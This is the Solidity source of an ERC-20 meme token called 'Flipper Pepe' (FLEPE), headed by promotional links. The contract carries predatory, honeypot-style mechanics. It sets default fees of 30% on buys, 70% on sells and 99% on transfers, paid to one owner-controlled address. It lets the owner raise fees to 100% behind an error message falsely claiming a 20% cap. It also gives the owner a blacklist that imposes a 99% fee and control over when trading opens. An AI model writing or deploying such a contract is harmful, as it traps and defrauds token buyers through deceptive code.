1 /**
2 FLIPPER PEPE GONNA FLIP PEPE
3 https://t.me/flipperpepecoineth
4 http://flipperpepe.vip/
5 https://twitter.com/Alex_Hugh3s/status/1699338990531325980*/
6 
7 // SPDX-License-Identifier: MIT
8 
9 pragma solidity 0.8.19;
10 
11 
12 library SafeMath {
13 
14     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
15         unchecked {
16             uint256 c = a + b;
17             if (c < a) return (false, 0);
18             return (true, c);
19         }
20     }
21 
22     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
23         unchecked {
24             if (b > a) return (false, 0);
25             return (true, a - b);
26         }
27     }
28 
29     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
30         unchecked {
31             if (a == 0) return (true, 0);
32             uint256 c = a * b;
33             if (c / a != b) return (false, 0);
34             return (true, c);
35         }
36     }
37 
38     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
39         unchecked {
40             if (b == 0) return (false, 0);
41             return (true, a / b);
42         }
43     }
44 
45     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
46         unchecked {
47             if (b == 0) return (false, 0);
48             return (true, a % b);
49         }
50     }
51 
52     function add(uint256 a, uint256 b) internal pure returns (uint256) {
53         return a + b;
54     }
55 
56     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
57         return a - b;
58     }
59 
60     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
61         return a * b;
62     }
63 
64     function div(uint256 a, uint256 b) internal pure returns (uint256) {
65         return a / b;
66     }
67 
68     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
69         return a % b;
70     }
71 
72     function sub(
73         uint256 a,
74         uint256 b,
75         string memory errorMessage
76     ) internal pure returns (uint256) {
77         unchecked {
78             require(b <= a, errorMessage);
79             return a - b;
80         }
81     }
82 
83     function div(
84         uint256 a,
85         uint256 b,
86         string memory errorMessage
87     ) internal pure returns (uint256) {
88         unchecked {
89             require(b > 0, errorMessage);
90             return a / b;
91         }
92     }
93 
94     function mod(
95         uint256 a,
96         uint256 b,
97         string memory errorMessage
98     ) internal pure returns (uint256) {
99         unchecked {
100             require(b > 0, errorMessage);
101             return a % b;
102         }
103     }
104 }
105 
106 interface IERC20 {
107     function decimals() external view returns (uint8);
108     function symbol() external view returns (string memory);
109     function name() external view returns (string memory);
110     function getOwner() external view returns (address);
111     function totalSupply() external view returns (uint256);
112     function balanceOf(address account) external view returns (uint256);
113     function transfer(address recipient, uint256 amount) external returns (bool);
114     function allowance(address _owner, address spender) external view returns (uint256);
115     function approve(address spender, uint256 amount) external returns (bool);
116     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
117     event Transfer(address indexed from, address indexed to, uint256 value);
118     event Approval(address indexed owner, address indexed spender, uint256 value);}
119 
120 abstract contract Ownable {
121     address internal owner;
122     constructor(address _owner) {owner = _owner;}
123     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
124     function isOwner(address account) public view returns (bool) {return account == owner;}
125     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
126     event OwnershipTransferred(address owner);
127 }
128 
129 interface IFactory{
130         function createPair(address tokenA, address tokenB) external returns (address pair);
131         function getPair(address tokenA, address tokenB) external view returns (address pair);
132 }
133 
134 interface IRouter {
135     function factory() external pure returns (address);
136     function WETH() external pure returns (address);
137     function addLiquidityETH(
138         address token,
139         uint amountTokenDesired,
140         uint amountTokenMin,
141         uint amountETHMin,
142         address to,
143         uint deadline
144     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
145 
146     function swapExactTokensForETHSupportingFeeOnTransferTokens(
147         uint amountIn,
148         uint amountOutMin,
149         address[] calldata path,
150         address to,
151         uint deadline) external;
152 }
153 
154 contract  FLEPE is IERC20, Ownable {
155     using SafeMath for uint256;
156     string private constant _name = 'Flipper Pepe';
157     string private constant _symbol = 'FLEPE ';
158     uint8 private constant _decimals = 9;
159     uint256 private _totalSupply =1000000000 * (10 ** _decimals) ;
160     mapping (address => uint256) _balances;
161     mapping (address => mapping (address => uint256)) private _allowances;
162     mapping (address => bool) public isFeeExempt;
163     mapping (address => bool) private isBot;
164     IRouter router;
165     address public pair;
166     bool private tradingAllowed = false;
167     bool private swapEnabled = true;
168     uint256 private swapTimes;
169     bool private swapping;
170     uint256 swapAmount = 1;
171     uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;
172     uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
173     modifier lockTheSwap {swapping = true; _; swapping = false;}
174     uint256 private liquidityFee = 0;
175     uint256 private marketingFee = 0;
176     uint256 private developmentFee = 1000;
177     uint256 private burnFee = 0;
178     uint256 private totalFee = 3000;
179     uint256 private sellFee = 7000;
180     uint256 private transferFee = 9900;
181     uint256 private denominator = 10000;
182     address internal constant DEAD =  0x000000000000000000000000000000000000dEaD;
183     address internal development_receiver = 0x7597D1c75CEDD4C4a60712e9a6a89cdBc2f63651; 
184     address internal marketing_receiver = 0x7597D1c75CEDD4C4a60712e9a6a89cdBc2f63651;
185     address internal liquidity_receiver = 0x7597D1c75CEDD4C4a60712e9a6a89cdBc2f63651;
186     uint256 public _maxTxAmount = ( _totalSupply * 70 ) / 10000;
187     uint256 public _maxSellAmount = ( _totalSupply * 300 ) / 10000;
188     uint256 public _maxWalletToken = ( _totalSupply * 100 ) / 10000;
189 
190     constructor() Ownable(msg.sender) {
191         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
192         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
193         router = _router; pair = _pair;
194         isFeeExempt[address(this)] = true;
195         isFeeExempt[liquidity_receiver] = true;
196         isFeeExempt[marketing_receiver] = true;
197         isFeeExempt[development_receiver] = true;
198         isFeeExempt[msg.sender] = true;
199         _balances[msg.sender] = _totalSupply;
200         emit Transfer(address(0), msg.sender, _totalSupply);
201     }
202 
203     receive() external payable {}
204     function name() public pure returns (string memory) {return _name;}
205     function symbol() public pure returns (string memory) {return _symbol;}
206     function decimals() public pure returns (uint8) {return _decimals;}
207     function startTrading() external onlyOwner {tradingAllowed = true;}
208     function getOwner() external view override returns (address) { return owner; }
209     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
210     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
211     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
212     function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
213     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
214     function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
215 
216     function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
217         bool aboveMin = amount >= minTokenAmount;
218         bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
219         return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
220     }
221 
222     function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
223         swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
224         minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
225     }
226 
227     function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
228         liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
229         require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
230     }
231 
232     function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
233         uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
234         _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
235         uint256 limit = totalSupply().mul(5).div(1000);
236         require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
237     }
238 
239     function setInternalAddresses(address _marketing, address _liquidity, address _development) external onlyOwner {
240         marketing_receiver = _marketing; liquidity_receiver = _liquidity; development_receiver = _development;
241         isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_development] = true;
242     }
243 
244     function setisBot(address[] calldata addresses, bool _enabled) external onlyOwner {
245         for(uint i=0; i < addresses.length; i++){
246         isBot[addresses[i]] = _enabled; }
247     }
248 
249     function manualSwap() external onlyOwner {
250         swapAndLiquify(swapThreshold);
251     }
252 
253     function rescueERC20(address _address, uint256 percent) external onlyOwner {
254         uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
255         IERC20(_address).transfer(development_receiver, _amount);
256     }
257 
258     function swapAndLiquify(uint256 tokens) private lockTheSwap {
259         uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
260         uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
261         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
262         uint256 initialBalance = address(this).balance;
263         swapTokensForETH(toSwap);
264         uint256 deltaBalance = address(this).balance.sub(initialBalance);
265         uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
266         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
267         if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
268         uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
269         if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
270         uint256 contractBalance = address(this).balance;
271         if(contractBalance > uint256(0)){payable(development_receiver).transfer(contractBalance);}
272     }
273 
274     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
275         _approve(address(this), address(router), tokenAmount);
276         router.addLiquidityETH{value: ETHAmount}(
277             address(this),
278             tokenAmount,
279             0,
280             0,
281             liquidity_receiver,
282             block.timestamp);
283     }
284 
285     function swapTokensForETH(uint256 tokenAmount) private {
286         address[] memory path = new address[](2);
287         path[0] = address(this);
288         path[1] = router.WETH();
289         _approve(address(this), address(router), tokenAmount);
290         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
291             tokenAmount,
292             0,
293             path,
294             address(this),
295             block.timestamp);
296     }
297 
298     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
299         return !isFeeExempt[sender] && !isFeeExempt[recipient];
300     }
301 
302     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
303         if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
304         if(recipient == pair){return sellFee;}
305         if(sender == pair){return totalFee;}
306         return transferFee;
307     }
308 
309     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
310         if(getTotalFee(sender, recipient) > 0){
311         uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
312         _balances[address(this)] = _balances[address(this)].add(feeAmount);
313         emit Transfer(sender, address(this), feeAmount);
314         if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
315         return amount.sub(feeAmount);} return amount;
316     }
317 
318     function _transfer(address sender, address recipient, uint256 amount) private {
319         require(sender != address(0), "ERC20: transfer from the zero address");
320         require(recipient != address(0), "ERC20: transfer to the zero address");
321         require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
322         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
323         if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
324         require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
325         if(sender != pair){require(amount <= _maxSellAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
326         require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded"); 
327         if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
328         if(shouldContractSwap(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
329         _balances[sender] = _balances[sender].sub(amount);
330         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
331         _balances[recipient] = _balances[recipient].add(amountReceived);
332         emit Transfer(sender, recipient, amountReceived);
333     }
334 
335     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
336         _transfer(sender, recipient, amount);
337         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
338         return true;
339     }
340 
341     function _approve(address owner, address spender, uint256 amount) private {
342         require(owner != address(0), "ERC20: approve from the zero address");
343         require(spender != address(0), "ERC20: approve to the zero address");
344         _allowances[owner][spender] = amount;
345         emit Approval(owner, spender, amount);
346     }
347 
348 }